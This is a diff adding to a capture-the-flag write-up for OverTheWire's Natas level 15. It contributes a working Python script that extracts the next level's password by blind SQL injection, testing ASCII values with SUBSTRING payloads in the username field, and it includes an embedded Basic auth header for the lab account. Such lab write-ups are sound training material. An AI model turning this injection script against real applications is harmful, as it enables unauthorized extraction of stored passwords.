@@ -105,3 +105,59 @@ Payload settings
 We found the second password character.
 ![Level 14.4 solution](./images/Level15.4_solution.png)
 
+We repeat this process 32 times to get the complete password for next Level. <br/>It took me about an hour to smuggle password char by char with Burp community addition, so i decided to write a script to do the same, just for the fun of it.
+
+
+```python
+ 1 #!/usr/bin/env python3
+ 2
+ 3 import requests
+ 4
+ 5 headers = {'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='}
+ 6 proxy = {'http': 'http://localhost:8080'}
+ 7
+ 8 password = ""
+ 9 pos = 1
+10
+11 while True:
+12     if password:
+13         payload = f'natas16" AND password = \'{password}\' ;#'
+14         data = {'username': payload}
+15         response = requests.post('http://natas15.natas.labs.overthewire.org/', data=data, headers=headers, proxies=proxy)
+16         if response.status_code == 200  and "This user exists" in response.text:
+17             print(f"\r{password}", end='', flush=True)
+18             break
+19
+20     for i in range(33,128):
+21         print(f"\r{password}{chr(i)}", end='', flush=False)
+22         payload = f'natas16" AND ASCII(SUBSTRING(password,{pos},1)) = {i};#'
+23         data = {'username': payload}
+24         response = requests.post('http://natas15.natas.labs.overthewire.org/', data=data, headers=headers, proxies=proxy)
+25         if response.status_code == 200:
+26             if 'This user exists.' in response.text:
+27                 password += chr(i)
+28                 print(f"\r{password}{chr(i)}", end='', flush=True)
+29                 #print(password)
+30                 break
+31             elif "This user doesn't exist" in response.text:
+32                 continue
+33             elif i == 127:
+34                 break
+35             else:
+36                 print('Program flow should not reach here. Exiting')
+37                 #return 2
+38         else:
+39             print(f"Status code: {response.status}")
+40     pos += 1
+41 # todo: refactor the code
+```
+
+I Added a cool effect that displays the found characters and also searches for next character.
+
+Here is the script in action
+[![asciicast](https://asciinema.org/a/ZCwEXkII8MAP1uguwL5OJDLjN.svg)](https://asciinema.org/a/ZCwEXkII8MAP1uguwL5OJDLjN)
+
+
+<br/>
+
+[<< Back](https://grey-fish.github.io/Natas/index.html)
